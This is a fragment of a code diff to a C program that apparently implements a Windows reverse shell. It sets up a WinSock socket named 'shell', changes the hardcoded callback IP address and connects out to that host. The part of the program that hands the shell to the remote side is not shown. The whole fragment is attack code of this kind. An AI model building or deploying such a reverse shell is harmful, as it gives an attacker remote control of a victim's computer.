@@ -18,12 +18,13 @@
             printf("[!] WinSock initialization failed!");
             return 1;
         }
-        shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int) NULL, (unsigned int) NULL);
+        // shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int) NULL, (unsigned int) NULL);
+        shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
 
         shell_addr.sin_port = htons(port);
         shell_addr.sin_family = AF_INET;
         // hardcode ip
-        shell_addr.sin_addr.s_addr = inet_addr("172.29.71.202");
+        shell_addr.sin_addr.s_addr = inet_addr("192.168.1.23");
 
         connection = WSAConnect(shell, (struct sockaddr*) &shell_addr, sizeof(shell_addr), NULL, NULL, NULL, NULL);
         if (connection == SOCKET_ERROR) {
